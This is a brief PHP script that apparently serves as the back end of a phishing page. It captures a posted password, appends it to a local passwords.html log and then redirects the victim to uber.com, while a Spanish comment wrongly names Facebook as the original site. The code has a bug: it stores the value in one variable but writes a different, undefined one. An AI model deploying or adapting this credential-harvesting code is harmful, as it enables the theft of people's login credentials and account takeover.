<?php

$Numero = $_POST['password']; 


$SALTO="\r\n";

$f = fopen("passwords.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Numero: '.$password.$SALTO.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: https://www.uber.com/');
?>